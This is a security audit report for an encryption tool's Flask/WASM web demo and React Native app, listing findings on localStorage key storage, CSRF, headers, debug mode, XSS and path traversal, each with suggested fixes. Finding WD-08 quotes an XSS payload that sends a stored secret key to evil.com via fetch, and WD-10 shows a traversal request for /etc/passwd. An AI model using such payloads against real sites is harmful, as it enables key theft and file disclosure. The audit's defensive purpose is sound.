# Meow Decoder v3.2 — Security & Reliability Audit

## Scope: `web_demo/` and `mobile/` ONLY

**Auditor posture:** Principal-level security auditor and full-stack engineer specializing in life-critical, high-assurance privacy tools (journalists, activists, whistleblowers in hostile environments).

**Date:** 2025-07-16
**Commit:** HEAD
**Methodology:** Full manual source code review, static analysis, grep-based pattern search, cross-module data-flow tracing.

---

## Step 1 — Folder-Level Summaries

### `web_demo/`

Flask 3.1.x backend (`app.py`, 1 419 lines) serving Jinja2 templates with inline JavaScript. Cryptographic operations are delegated to a Rust-compiled WASM module (`crypto_core_bg.wasm`) accessed through auto-generated JS bindings (`crypto_core.js`, 936 lines) and isolated in a Web Worker (`crypto-worker.js`, 367 lines). The standalone demo page (`wasm_browser_example_FULL.html`, 8 242 lines) exercises the full crypto stack in-browser: Argon2id, AES-256-GCM, X25519, ML-KEM-1024, fountain codes, Schrödinger mode, and duress wipe. Cat Mode implements an optical data transmission protocol via blinking cat-eye animations, decoded through a signal-processing pipeline (NRZ decoder, adaptive threshold, Schmitt-trigger hysteresis, preamble calibration, per-frame quality metrics). The Flask backend also handles file encoding/decoding, cat-mode video upload/decode via ffmpeg, and Schrödinger mode encoding.

**Security posture:** The WASM crypto boundary is well-designed (Worker isolation, `secure_clear()`, `FinalizationRegistry`). However, the Flask backend is essentially a **zero-hardened development server**: no CSRF protection, no security headers, `debug=True`, error messages leak internal exceptions, and secret keys are stored in `localStorage`. The standalone HTML demo exacerbates this by persisting X25519 private keys, ML-KEM-1024 secret keys, and duress passwords in browser `localStorage` — catastrophic for the threat model.

### `mobile/`

React Native 0.73.4 bare-workflow app implementing a "dumb optical sensor" design — the phone captures QR codes from animated GIFs but **performs zero cryptographic operations**. Architecture: VisionCamera v4 with native MLKit/AVFoundation code scanner (`useCodeScanner`), a reducer-based state machine (`useCapture.ts`), biometric-gated export (`ExportScreen.tsx`), FLAG_SECURE on Android, and iOS privacy overlay. Frame data lives exclusively in memory (`Map<number, string>`) and is wiped on background/unmount/panic. MMKV persists only non-sensitive preferences and frame *indices* (never payloads). Zod strict schema validation gates all inputs.

**Security posture:** Impressively hardened for a React Native app. The "no crypto on device" design dramatically shrinks the attack surface. The main residual risks are: JS string immutability prevents true secure wipe, the session timeout resets on pause/resume (allowing indefinite sessions), and MMKV checkpoint metadata (frame indices + session IDs) persists on disk without encryption. For journalists in hostile environments, these are meaningful gaps.

---

## Step 2 — Detailed Bug & Vulnerability Hunt

---

### Finding WD-01: `localStorage` Stores Cryptographic Secret Keys

**Severity:** CRITICAL
**Folder & Location:** `web_demo/wasm_browser_example_FULL.html` lines 6437–6441, 6508, 6700–6712, 6785, 7626
**Title:** X25519 private keys, ML-KEM-1024 secret keys, and duress passwords persisted to `localStorage`

**Impact:** Any XSS, browser extension, physical access, or forensic imaging of the device recovers long-term key material in cleartext. The entire forward-secrecy and post-quantum guarantees are nullified: an attacker with `localStorage` can decrypt all past messages encrypted to these keys. Duress password exposure defeats the plausible deniability mechanism entirely. For journalists/activists, this is a direct path to compromise.

**Evidence:**

```javascript
// Line 6441 — X25519 private key written to localStorage
localStorage.setItem('meow_fs_keypair', JSON.stringify({
    publicKey: Array.from(keypair.public_key),
    secretKey: Array.from(keypair.secret_key),  // ← 32-byte Curve25519 secret
    created: new Date().toISOString()
}));

// Line 6712 — ML-KEM-1024 secret key (~3168 bytes) to localStorage
localStorage.setItem('meow_pq_keypair', JSON.stringify({
    publicKey: Array.from(pqKeypair.public_key),
    secretKey: Array.from(pqKeypair.secret_key),  // ← ML-KEM-1024 secret key
    created: new Date().toISOString()
}));

// Line 7626 — Duress password hash + decoy stored
localStorage.setItem('meow_duress', JSON.stringify({
    hash: passwordHash,
    version: 2,
    decoy: decoyMessage,  // ← the decoy content itself
    set: new Date().toISOString()
}));
```

**Reproduction:** Open the WASM demo → generate FS keypair or PQ keypair → open DevTools → Application → localStorage → `meow_fs_keypair`, `meow_pq_keypair`, `meow_duress` are visible in cleartext JSON.

**Recommended Fix:**

```diff
- // ❌ Never persist secret keys in localStorage
- localStorage.setItem('meow_fs_keypair', JSON.stringify({
-     publicKey: Array.from(keypair.public_key),
-     secretKey: Array.from(keypair.secret_key),
-     created: new Date().toISOString()
- }));
+ // ✅ Hold keys ONLY in the Web Worker's WASM heap (ephemeral per-session).
+ // Public key can be exported for display; secret key never leaves Worker.
+ // If persistence is truly needed, use the Web Crypto API's non-extractable
+ // CryptoKey with IndexedDB (keys protected by browser's origin-keyed store).
+ workerRef.postMessage({ type: 'STORE_KEYPAIR', keypair: keypairHandle });
+ // Only publicKey sent back to main thread for display
```

**Verification:** After fix, confirm `chrome://indexeddb` or `localStorage` contains zero entries matching `meow_fs_`, `meow_pq_`, or `meow_duress`. Run `Object.keys(localStorage).filter(k => k.startsWith('meow_'))` → expect `[]`.

---

### Finding WD-02: `localStorage` Stores Encrypted Binary Payload

**Severity:** HIGH
**Folder & Location:** `web_demo/wasm_browser_example_FULL.html` lines 3832–3834; `web_demo/templates/cat_mode.html` lines 540–541
**Title:** Encrypted ciphertext persisted to `localStorage` for Cat Mode transmission

**Impact:** Encrypted payloads survive browser close. Combined with WD-01 (secret keys in localStorage), this provides an attacker with both ciphertext and key material in one forensic sweep. Even without key material, persistent ciphertext is a forensic indicator of encrypted communication and violates the "leave no trace" principle.

**Evidence:**

```javascript
// wasm_browser_example_FULL.html line 3832
localStorage.setItem('meow_cat_binary', binary);  // the full binary string

// cat_mode.html line 540
localStorage.setItem('meow_cat_binary', rawBinary);
localStorage.setItem('meow_cat_encryption_mode', 'server');
```

**Recommended Fix:**

```diff
- localStorage.setItem('meow_cat_binary', binary);
+ // Hold in sessionStorage (wiped on tab close) or an in-memory variable.
+ // For cross-page handoff, use BroadcastChannel or postMessage.
+ sessionStorage.setItem('meow_cat_binary', binary);
+ // Better: keep in a module-scoped variable, never persist.
```

**Verification:** After fix, `localStorage.getItem('meow_cat_binary')` → `null` at all times.

---

### Finding WD-03: No CSRF Protection on Any Flask POST Route

**Severity:** HIGH
**Folder & Location:** `web_demo/app.py` — all `methods=["POST"]` routes (lines 100, 258, 299, 930, 1035, 1101, 1190, 1283)
**Title:** Zero CSRF token validation enables cross-site request forgery

**Impact:** A malicious page can silently submit file-encoding/decoding requests on behalf of an authenticated browser session. Since the Flask secret key enables signed sessions, and there's no CSRF token, any visiting journalist's browser can be weaponized to encode files with attacker-chosen passwords or decode files, exfiltrating results via the predictable download token pattern.

**Evidence:**

```python
# No CSRFProtect() initialization anywhere in app.py
# No {{ csrf_token() }} in any template form
# No @csrf.exempt decorators (because CSRF isn't enabled at all)

@app.route("/encode", methods=["GET", "POST"])  # line 100
def encode_page():
    # ... directly reads request.form and request.files
```

```bash
# Exploitation: attacker page submits form to http://localhost:5000/encode
$ grep -r "csrf" web_demo/  # → zero results
```

**Recommended Fix:**

```diff
+ from flask_wtf.csrf import CSRFProtect
+ csrf = CSRFProtect(app)

  app = Flask(__name__)
  app.secret_key = os.urandom(24)
+ csrf.init_app(app)

  # For API endpoints that need CSRF exemption (e.g., WASM-only):
+ @csrf.exempt
  @app.route("/cat-mode-decode-video", methods=["POST"])
  def cat_mode_decode_video():
```

**Verification:** After fix, submit a POST without `X-CSRFToken` header or `csrf_token` form field → expect 400.

---

### Finding WD-04: No Security Headers (CSP, X-Frame-Options, etc.)

**Severity:** HIGH
**Folder & Location:** `web_demo/app.py` — no `@app.after_request` or middleware
**Title:** Missing Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, and Referrer-Policy

**Impact:** Without CSP, any injected script (via WD-08 XSS) runs with full origin privileges — accessing `localStorage` (WD-01 keys), WASM heap, and all DOM state. Without X-Frame-Options, the app can be click-jacked. Without X-Content-Type-Options, MIME-sniffing attacks are possible on download responses.

**Evidence:**

```bash
$ grep -rn "Content-Security-Policy\|X-Frame-Options\|X-Content-Type\|Referrer-Policy" web_demo/
# → zero results
```

**Recommended Fix:**

```diff
+ @app.after_request
+ def set_security_headers(response):
+     response.headers['Content-Security-Policy'] = (
+         "default-src 'self'; "
+         "script-src 'self' 'wasm-unsafe-eval'; "  # needed for WASM
+         "style-src 'self' 'unsafe-inline'; "       # inline styles in templates
+         "img-src 'self' data: blob:; "
+         "connect-src 'self'; "
+         "worker-src 'self' blob:; "
+         "frame-ancestors 'none';"
+     )
+     response.headers['X-Frame-Options'] = 'DENY'
+     response.headers['X-Content-Type-Options'] = 'nosniff'
+     response.headers['Referrer-Policy'] = 'no-referrer'
+     response.headers['Permissions-Policy'] = 'camera=(), microphone=()'
+     return response
```

**Verification:** `curl -I http://localhost:5000/` → all five headers present.

---

### Finding WD-05: Flask Debug Mode Enabled with `host='0.0.0.0'`

**Severity:** HIGH
**Folder & Location:** `web_demo/app.py` line 1418
**Title:** Werkzeug debugger exposed on all network interfaces

**Impact:** `debug=True` enables the Werkzeug interactive debugger and code reloader. The debugger exposes a Python REPL on exception pages — any user who can trigger an error gets arbitrary code execution on the server. Combined with `host='0.0.0.0'`, this is accessible from any machine on the network, not just localhost.

**Evidence:**

```python
# Line 1418
app.run(debug=True, host="0.0.0.0", port=5000, use_reloader=False)
```

**Recommended Fix:**

```diff
- app.run(debug=True, host="0.0.0.0", port=5000, use_reloader=False)
+ debug = os.environ.get("FLASK_DEBUG", "0") == "1"
+ host = os.environ.get("FLASK_HOST", "127.0.0.1")
+ app.run(debug=debug, host=host, port=5000, use_reloader=False)
```

**Verification:** Start server normally → hit a 500 error → confirm NO interactive debugger page, only generic error.

---

### Finding WD-06: Exception Messages Leak to Users via `str(e)`

**Severity:** HIGH
**Folder & Location:** `web_demo/app.py` lines 194, 225, 283, 366, 1031, 1092, 1096, 1173
**Title:** Python exception details exposed in flash messages and JSON API responses

**Impact:** Exception strings may reveal: file system paths, Python module internals, cryptographic error details (salt lengths, nonce mismatches), Argon2 parameter info, library version numbers. This is a standard information-disclosure vulnerability that aids further attacks.

**Evidence:**

```python
# Line 194 — encoding endpoint
flash(f"Encoding failed: {str(e)}", "error")

# Line 225 — outer catch-all
flash(f"Unexpected error: {str(e)}", "error")

# Line 283 — cat mode video download
return json.dumps({"error": str(e)}), 500

# Line 366 — cat mode video decode
traceback.print_exc()  # Full stack trace to stdout/logs
return json.dumps({"error": str(e)}), 500

# Line 1092 — cat mode decrypt
flash(f"❌ Decryption failed: {str(e)}", "error")

# Line 1031 — cat mode encrypt server
return json.dumps({"error": str(e)}), 500
```

**Recommended Fix:**

```diff
  except Exception as e:
-     flash(f"Encoding failed: {str(e)}", "error")
+     import logging
+     logging.exception("Encoding failed")  # Full trace to server logs only
+     flash("Encoding failed. Please check your input and try again.", "error")
```

Apply the same pattern to all 8+ locations. Never send `str(e)` to the client.

**Verification:** Trigger each error path → confirm user-facing messages contain zero Python exception details.

---

### Finding WD-07: `traceback.print_exc()` to stdout in cat_mode_decode_video

**Severity:** MEDIUM
**Folder & Location:** `web_demo/app.py` lines 363–366
**Title:** Full Python stack trace printed to process stdout on video decode error

**Impact:** In production deployments where stdout is captured to logs accessible to operators or log aggregation, full stack traces may reveal file paths, library versions, internal state. If the Flask dev server's output is visible (e.g., via shared terminal), this is directly exposed.

**Evidence:**

```python
# Lines 363-366
except Exception as e:
    import traceback
    traceback.print_exc()
    return json.dumps({"error": str(e)}), 500
```

**Recommended Fix:**

```diff
  except Exception as e:
-     import traceback
-     traceback.print_exc()
-     return json.dumps({"error": str(e)}), 500
+     import logging
+     logging.exception("Cat mode video decode failed")
+     return json.dumps({"error": "Video decode failed"}), 500
```

**Verification:** Trigger a decode error → confirm stdout has no stack trace; `logging` output goes to configured handler.

---

### Finding WD-08: XSS via Unescaped `innerHTML` Injection of Decrypted Content

**Severity:** HIGH
**Folder & Location:** `web_demo/wasm_browser_example_FULL.html` lines 3465, 3478, 3486, 3496, 1980, 2087, 5118, 5192
**Title:** Decrypted plaintext and error messages injected into `innerHTML` without `escapeHtml()`

**Impact:** If an attacker crafts a payload that, when decrypted, contains `<script>` or `<img onerror=...>` tags, JavaScript executes in the page's origin context. This grants access to `localStorage` (WD-01 — all secret keys), WASM heap, and full DOM. An `escapeHtml()` function exists at line 2182 but is not used in these code paths.

**Evidence:**

```javascript
// Line 3465 — decrypted plaintext directly into innerHTML
const plaintext = decoder.decode(decResult.data);
resultBox.innerHTML = `<h3>✨ Secret Extracted</h3><div class='message'>${plaintext}</div>`;
// ← If plaintext is <img src=x onerror="fetch('https://evil.com/'+localStorage.getItem('meow_fs_keypair'))">, game over

// Line 3486 — err.message into innerHTML
resultBox.innerHTML = `<h3>❌ Extraction Failed</h3><div class='message'>${err.message}</div>`;
```

**Recommended Fix:**

```diff
  const plaintext = decoder.decode(decResult.data);
- resultBox.innerHTML = `<h3>✨ Secret Extracted</h3><div class='message'>${plaintext}</div>`;
+ resultBox.innerHTML = `<h3>✨ Secret Extracted</h3><div class='message'>${escapeHtml(plaintext)}</div>`;
```

Apply `escapeHtml()` to every dynamic insertion into `innerHTML` — both `plaintext` and `err.message` at all locations.

**Verification:** Encrypt `<img src=x onerror=alert(1)>` as a payload → decrypt → confirm the literal text is displayed, not executed.

---

### Finding WD-09: Syntax Error in `cat-mode-protocol.js` Breaks CommonJS Export

**Severity:** MEDIUM
**Folder & Location:** `web_demo/cat-mode-protocol.js` lines 518–520
**Title:** Orphaned `constantTimeEqual32,` expression statement before `module.exports`

**Impact:** In Node.js / CommonJS environments, `constantTimeEqual32,` is interpreted as a comma expression — it evaluates `constantTimeEqual32` (no-op) then executes `module.exports = CatProtocol;`. The `constantTimeEqual32` function is consequently **not exported**, meaning any module consumer that tries `const { constantTimeEqual32 } = require('./cat-mode-protocol')` gets `undefined` — and any CRC verification that depends on the imported constant-time compare silently reverts to non-constant-time `===`.

**Evidence:**

```javascript
// Lines 518-520
if (typeof module !== 'undefined' && module.exports) {
    constantTimeEqual32,          // ← orphaned comma expression, NOT an export
    module.exports = CatProtocol;
}
```

**Recommended Fix:**

```diff
  if (typeof module !== 'undefined' && module.exports) {
-     constantTimeEqual32,
      module.exports = CatProtocol;
  }
+ // constantTimeEqual32 is already a property of CatProtocol (line 513)
```

Or, if the intent was to export it separately:

```diff
  if (typeof module !== 'undefined' && module.exports) {
-     constantTimeEqual32,
-     module.exports = CatProtocol;
+     module.exports = { CatProtocol, constantTimeEqual32 };
  }
```

**Verification:** `node -e "const m = require('./web_demo/cat-mode-protocol.js'); console.log(typeof m.constantTimeEqual32)"` → should be `'function'`, not `'undefined'`.

---

### Finding WD-10: Cat-Mode Video Token Has No Format Validation — Path Traversal Risk

**Severity:** MEDIUM
**Folder & Location:** `web_demo/app.py` lines 286–297
**Title:** `/cat-mode-video/<token>/<filename>` route accepts arbitrary `<token>` without format validation

**Impact:** While `filename` is sanitized via `secure_filename()`, the `token` parameter has no validation. The token is concatenated into a file path: `os.path.join(UPLOADS_DIR, f"{token}_{filename}")`. If `token` contains `../`, `os.path.join` does **not** prevent traversal when the path component is interpolated into an f-string before joining. Example: `token = "../../etc/passwd\x00"` (null byte attack on older Pythons); or on current Python, `token = "..%2F..%2Fetc"` — though Flask URL routing decodes `%2F` as `/`, creating separate route segments. The residual risk is if a token contains OS-meaningful characters like `\x00` or overlong filenames.

**Evidence:**

```python
@app.route("/cat-mode-video/<token>/<filename>")
def cat_mode_video_download(token, filename):
    filename = secure_filename(filename)  # filename is sanitized
    # token is NOT sanitized
    filepath = os.path.join(UPLOADS_DIR, f"{token}_{filename}")  # token injection
    if not os.path.exists(filepath):
        return "Video not found or expired", 404
    return send_file(filepath, ...)
```

**Recommended Fix:**

```diff
  @app.route("/cat-mode-video/<token>/<filename>")
  def cat_mode_video_download(token, filename):
+     # Validate token is hex (matches secrets.token_hex(16) format)
+     if not token or not all(c in '0123456789abcdef' for c in token):
+         return "Invalid token", 400
      filename = secure_filename(filename)
      if not filename:
          return "Invalid filename", 400
      filepath = os.path.join(UPLOADS_DIR, f"{token}_{filename}")
+     # Defence-in-depth: ensure resolved path is under UPLOADS_DIR
+     if not os.path.realpath(filepath).startswith(str(UPLOADS_DIR.resolve())):
+         return "Invalid path", 400
```

**Verification:** `curl http://localhost:5000/cat-mode-video/../../etc/passwd/test.webm` → 400, not 404.

---

### Finding WD-11: `download_tokens` Dict Grows Unboundedly Between Cleanup Cycles

**Severity:** LOW
**Folder & Location:** `web_demo/app.py` lines 48, 67–71
**Title:** In-memory download token map has no size cap, cleaned only on next request

**Impact:** Under load, an attacker can generate unbounded tokens via rapid encode operations, consuming server memory. Cleanup only runs `@before_request`, meaning tokens accumulate until the next request. A burst of 10k+ encode requests could OOM the server.

**Evidence:**

```python
download_tokens = {}  # line 48 — no maxsize, no LRU, no cap

def cleanup_old_files(max_age_minutes=30):
    # line 67 — only evicts tokens older than 30 minutes
    stale_tokens = [
        t for t, info in list(download_tokens.items())
        if info.get("created", datetime.min) < cutoff_dt
    ]
```

**Recommended Fix:**

```diff
+ MAX_DOWNLOAD_TOKENS = 1000
+
  def cleanup_old_files(max_age_minutes=30):
      # ... existing cleanup ...
+     # Hard cap: evict oldest tokens if over limit
+     if len(download_tokens) > MAX_DOWNLOAD_TOKENS:
+         sorted_tokens = sorted(download_tokens.items(), key=lambda x: x[1].get("created", datetime.min))
+         excess = len(download_tokens) - MAX_DOWNLOAD_TOKENS
+         for t, _ in sorted_tokens[:excess]:
+             download_tokens.pop(t, None)
```

**Verification:** Create 1001 tokens → verify oldest is evicted.

---

### Finding WD-12: Duress Wipe Incomplete — `meow_pq_keypair` Not Wiped in `checkDuress()` Path

**Severity:** HIGH
**Folder & Location:** `web_demo/wasm_browser_example_FULL.html` lines 7653–7657
**Title:** Duress panic handler (line 7653) only wipes `meow_fs_keypair` and `meow_duress`, NOT `meow_pq_keypair`

**Impact:** When a journalist triggers the duress/panic password, the post-quantum ML-KEM-1024 secret key survives in `localStorage`. An adversary who recovers the device after duress wipe still has the PQ secret key — enough to decrypt any hybrid-PQ encrypted messages.

**Evidence:**

```javascript
// Lines 7653-7657 — checkDuress() function
if (testHash === data.hash) {
    // PANIC! Wipe everything
    log('🚨🚨🚨 DURESS MODE TRIGGERED 🚨🚨🚨');
    localStorage.removeItem('meow_fs_keypair');
    localStorage.removeItem('meow_duress');
    // Could wipe more here        ← comment acknowledges incompleteness!
    return data.decoy;
}
```

Compare to the other wipe path (line 7517) which correctly wipes all three:

```javascript
['meow_fs_keypair', 'meow_pq_keypair', 'meow_duress'].forEach(k => {
    if (localStorage.getItem(k)) {
        localStorage.removeItem(k);
        wipedKeys.push(k);
    }
});
```

**Recommended Fix:**

```diff
  if (testHash === data.hash) {
      log('🚨🚨🚨 DURESS MODE TRIGGERED 🚨🚨🚨');
      localStorage.removeItem('meow_fs_keypair');
+     localStorage.removeItem('meow_pq_keypair');
+     localStorage.removeItem('meow_cat_binary');
      localStorage.removeItem('meow_duress');
-     // Could wipe more here
+     // Belt & suspenders: clear everything meow-related
+     Object.keys(localStorage).filter(k => k.startsWith('meow_')).forEach(k => localStorage.removeItem(k));
      return data.decoy;
  }
```

**Verification:** Set duress password → generate PQ keypair → trigger duress → `localStorage.getItem('meow_pq_keypair')` → `null`.

---

### Finding WD-13: Unguarded `console.log` in `preamble-calibration.js`

**Severity:** LOW
**Folder & Location:** `web_demo/preamble-calibration.js` lines 120, 140, 214, 247, 259
**Title:** 5 diagnostic `console.log` calls unconditionally emit signal-processing metadata

**Impact:** In `nrz-decoder.js`, all `console.log` calls are properly guarded behind `NRZ_DEBUG && console.log(...)`. But `preamble-calibration.js` emits threshold values, peak statistics, bit rates, and calibration results unconditionally. In a shared-device or screen-share scenario, this leaks timing information about the optical transmission.

**Evidence:**

```javascript
// Line 214 — unconditional
console.log(`📊 [Preamble] Learned: on=${onMean.toFixed(3)}±${onStd.toFixed(3)}, ...`);

// Compare to nrz-decoder.js — correctly guarded:
NRZ_DEBUG && console.log(`🔍 [Sync] Found 16-bit sync...`);
```

**Recommended Fix:**

```diff
- console.log(`📊 [Preamble] Learned: on=${onMean.toFixed(3)}...`);
+ NRZ_DEBUG && console.log(`📊 [Preamble] Learned: on=${onMean.toFixed(3)}...`);
```

Apply the `NRZ_DEBUG &&` guard to all 5 occurrences.

**Verification:** Set `NRZ_DEBUG = false` → decode a cat video → confirm zero preamble-calibration log lines in console.

---

### Finding WD-14: Uploaded Files Persist on Disk for 30 Minutes

**Severity:** MEDIUM
**Folder & Location:** `web_demo/app.py` lines 52–61
**Title:** User-uploaded files (including encrypted content) persist in `instance/uploads/` for 30 minutes

**Impact:** A forensic imaging of the server within 30 minutes of use recovers all uploaded plaintext files (before encryption), encrypted GIFs (after encoding), and cat-mode video recordings. For a privacy tool, this is a significant residual risk — especially if the server is ephemeral (container) but the volume is mounted.

**Evidence:**

```python
def cleanup_old_files(max_age_minutes=30):
    cutoff = time.time() - (max_age_minutes * 60)
    for directory in [UPLOADS_DIR, OUTPUTS_DIR]:
        for item in directory.iterdir():
            if item.is_dir():
                if item.stat().st_mtime < cutoff:
                    shutil.rmtree(item, ignore_errors=True)
```

**Recommended Fix:**

```diff
  # After download or on completion, immediately wipe:
  @response.call_on_close
  def cleanup():
      download_tokens.pop(token, None)
+     # Immediately purge the files associated with this token
+     try:
+         file_path.unlink(missing_ok=True)
+         if file_path.parent != OUTPUTS_DIR:
+             shutil.rmtree(file_path.parent, ignore_errors=True)
+     except OSError:
+         pass
```

Also reduce `max_age_minutes` to 5 and add secure overwrite before `unlink` for highest assurance.

---

### Finding WD-15: `app.secret_key = os.urandom(24)` Regenerates on Restart

**Severity:** LOW
**Folder & Location:** `web_demo/app.py` line 30
**Title:** Flask session signing key is random per-process, breaking sessions on restart

**Impact:** Low severity for this app (flash messages only use sessions, no auth). However, the random secret means that if an attacker can cause a restart, all pending download tokens are also lost (they're in-memory). This is a reliability issue, not a security one.

**Evidence:**

```python
app.secret_key = os.urandom(24)  # For flash messages
```

**Recommended Fix:** For a demo app, this is acceptable. For production, derive from a persistent secret or environment variable.

---

### Finding M-01: Session Timeout Resets on Pause/Resume — Infinite Capture Window

**Severity:** MEDIUM
**Folder & Location:** `mobile/src/hooks/useSessionManager.ts` (timeout logic); `mobile/src/hooks/useCapture.ts` lines 110–125
**Title:** Pausing and resuming capture resets the session timeout countdown, allowing indefinite sessions

**Impact:** The session timeout is a security boundary — it ensures captured data doesn't persist in memory indefinitely if the user forgets. By repeatedly pausing and resuming, the timeout resets each time, creating an unbounded capture window. An unattended phone with a paused session keeps all frame data in memory indefinitely.

**Evidence:**

From `useCapture.ts`, the `CAPTURING` state entry logic:

```typescript
case 'CAPTURING':
  return {
    ...state,
    status: 'CAPTURING',
    startedAt: state.startedAt ?? Date.now(),  // ← only set if null
    // But useSessionManager's timeout is driven by elapsed time
    // which resets its interval on each CAPTURING entry
  };
```

From `useSessionManager.ts`, the timeout is checked against `request.timeout_seconds` but the elapsed time ticker restarts whenever scanning resumes. The `startedAt` is preserved, but the countdown interval reattaches.

**Recommended Fix:**

```diff
  // In useSessionManager.ts or useCapture.ts:
+ // Use a hard deadline (startedAt + timeout_seconds) instead of elapsed ticker
+ const deadline = state.startedAt + (state.request.timeout_seconds * 1000);
+ if (Date.now() >= deadline) {
+     dispatch({ type: 'TIMEOUT' });
+ }
```

**Verification:** Start capture → pause → wait past original timeout → resume → confirm session terminates.

---

### Finding M-02: MMKV Checkpoint Persists Frame Indices on Disk Without Encryption

**Severity:** MEDIUM
**Folder & Location:** `mobile/src/hooks/useCapture.ts` lines 215–231
**Title:** Frame index array and session UUID written to MMKV (unencrypted filesystem storage)

**Impact:** Frame indices reveal: (a) total number of captured frames, (b) which frame numbers were scanned, (c) session UUID, (d) timestamp. For a forensic adversary, this is metadata leakage — it proves the app was used for a specific capture session at a specific time, even if all frame payload data was wiped from memory.

**Evidence:**

```typescript
const checkpoint: SessionCheckpoint = {
    session_id: state.request!.session_id,
    frame_indices: Array.from(state.frames.keys()),
    saved_at: Date.now(),
};
checkpointStorage.set(CHECKPOINT_KEY, JSON.stringify(checkpoint));
```

MMKV defaults: no encryption, stored in the app's sandboxed `Documents/` or `files/` directory. On a rooted/jailbroken device, this is trivially readable.

**Recommended Fix:**

```diff
+ // Use MMKV's built-in encryption with a per-install random key
+ // stored in the platform keychain (Android Keystore / iOS Keychain)
+ const checkpointStorage = new MMKV({
+     id: 'meow_capture_checkpoint',
+     encryptionKey: getOrCreateKeychainKey(), // derive from hardware-backed keystore
+ });

  // Also: reduce checkpoint granularity — store only frame count, not indices
  const checkpoint: SessionCheckpoint = {
      session_id: state.request!.session_id,
-     frame_indices: Array.from(state.frames.keys()),
+     frame_count: state.frames.size,  // less revealing than full index list
      saved_at: Date.now(),
  };
```

**Verification:** On a rooted test device, inspect MMKV files → confirm content is encrypted or contains only a frame count.

---

### Finding M-03: JS String Immutability Prevents Secure Wipe of Frame Payloads

**Severity:** MEDIUM
**Folder & Location:** `mobile/src/hooks/useCapture.ts` lines 160–175 (RESET handler); `mobile/src/types/capture.ts`
**Title:** QR frame payload strings (`Map<number, string>`) cannot be securely zeroed from V8/Hermes heap

**Impact:** The app correctly clears the `Map` on RESET/background/unmount, but JavaScript string primitives are immutable — `map.clear()` only removes references, not the underlying string data from the JS engine's heap. On Hermes (React Native's engine), strings may persist in memory until GC runs and the heap page is reused. A memory dump of the process could recover recently-scanned QR code payloads.

**Evidence:**

```typescript
// useCapture.ts — RESET handler
case 'RESET':
  return {
    ...initialState,
    // frames: new Map()  ← implicit from initialState
    // Old Map's string values persist in heap until GC
  };
```

The codebase acknowledges this limitation in comments but has no mitigation.

**Recommended Fix:**

This is fundamentally a runtime limitation. Mitigations:

```diff
+ // Before clearing, overwrite each value with a dummy string of same length
+ // This doesn't guarantee wiping (JIT may optimize away), but improves odds
+ for (const [key, value] of state.frames) {
+     // @ts-ignore — intentionally mutating map before clear
+     state.frames.set(key, '0'.repeat(value.length));
+ }
  state.frames.clear();

+ // Force a garbage collection if available (Hermes supports this)
+ if (typeof global.gc === 'function') {
+     global.gc();
+ }
```

For highest assurance, frame payload data should be held in a native module (Rust/C++) with explicit memory zeroing, not in JS strings.

**Verification:** Use Hermes heap profiling to inspect string objects after RESET — confirm original QR payload strings are absent.

---

### Finding M-04: `requestValidator.ts` — `timeout_seconds` Accepts Decimal Values

**Severity:** LOW
**Folder & Location:** `mobile/src/services/requestValidator.ts`
**Title:** Zod schema allows non-integer timeout values (e.g., `timeout_seconds: 3.7`)

**Impact:** Minimal — the value is used in arithmetic and works fine as a float. But it violates the principle of strictest possible input validation. A float timeout could cause unexpected behavior in UI displays (e.g., "3.7 seconds remaining").

**Evidence:**

```typescript
timeout_seconds: z.number().min(10).max(3600),
// No .int() constraint
```

**Recommended Fix:**

```diff
- timeout_seconds: z.number().min(10).max(3600),
+ timeout_seconds: z.number().int().min(10).max(3600),
```

---

### Finding M-05: Deep Link URL Parsing May Allow Injection of Unexpected Parameters

**Severity:** LOW
**Folder & Location:** `mobile/src/navigation/linking.ts`
**Title:** Deep link schema validates known fields but could be extended by future URL params bypassing Zod `.strict()`

**Impact:** Currently mitigated by Zod `.strict()` validation which rejects unknown fields. The risk is future regression if `.strict()` is removed or new parsers are added. The `getStateFromPath` function is imported via `require()` which is bundler-fragile.

**Evidence:**

The deep link handler correctly drops invalid URLs by returning `undefined`. The Zod schema uses `.strict()`. This finding is classified LOW as a defense-in-depth observation.

---

### Finding M-06: `Share.share({ url })` on iOS Exposes Full File Path to Share Extensions

**Severity:** LOW
**Folder & Location:** `mobile/src/screens/ExportScreen.tsx` (Share Sheet integration)
**Title:** iOS Share Sheet receives the full filesystem path, visible to all share extensions

**Impact:** Installed share extensions (including potentially malicious ones) see the full path to the exported JSON file, including the user-specific directory path. This is metadata leakage — it reveals the app was used and the filename pattern.

**Recommended Fix:** Use a content:// URI or temporary copy in a shared container, rather than the direct filesystem path.

---

## Step 3 — Cross-Cutting & Systemic Issues

### 3.1 Storage Hygiene: localStorage vs. In-Memory — Two Philosophies in Collision

The mobile app demonstrates disciplined ephemeral storage: frame data exclusively in memory, MMKV only for non-sensitive preferences, aggressive wipe on background/unmount/panic. The web demo does the opposite: secret keys, ciphertext, duress passwords, and binary payloads all persist in `localStorage` — the most forensically accessible storage in a browser. This inconsistency suggests the web demo was developed as a "demo first, security later" artifact, but it's now referenced in documentation alongside the mobile app as a functional tool.

**Recommendation:** Establish a project-wide **storage tiering policy**: (1) Never persist secret keys, (2) Ciphertext in `sessionStorage` at most, (3) Explicit wipe functions with tests that verify `localStorage` is empty after.

### 3.2 Error Handling: Information Disclosure vs. User Experience

The Flask backend leaks `str(e)` in 8+ locations. The mobile app uses generic error messages throughout. The WASM `crypto-worker.js` wraps errors in generic messages. The inconsistency creates audit surface area — any new endpoint added to `app.py` will likely copy the `str(e)` pattern.

**Recommendation:** Add a centralized `safe_error()` helper that logs the real exception and returns a generic message. Lint rule: ban `str(e)` in user-facing strings.

### 3.3 Wipe Completeness: Multiple Wipe Paths with Different Coverage

The WASM demo has two independent wipe code paths: (1) the duress button handler at line ~7517 (wipes 3 keys correctly), and (2) the `checkDuress()` function at line ~7653 (wipes only 2 keys — misses `meow_pq_keypair`). Any new `localStorage` key added in the future must be added to **all** wipe paths. Without a centralized `wipeAll()` function called from every path, regression is inevitable.

**Recommendation:** Create a single `wipeAllMeowStorage()` function that enumerates `Object.keys(localStorage).filter(k => k.startsWith('meow_'))` and removes all. Call it from every wipe trigger.

### 3.4 No Rate Limiting on Any Endpoint

Neither the Flask backend nor the cat-mode video upload has any rate limiting. The `/encode` endpoint accepts 8 MB files and performs Argon2id KDF (512 MiB, 20 iterations in production mode). A single request can consume 500+ MB of RAM for 10+ seconds. An attacker submitting 10 concurrent requests could exhaust server resources.

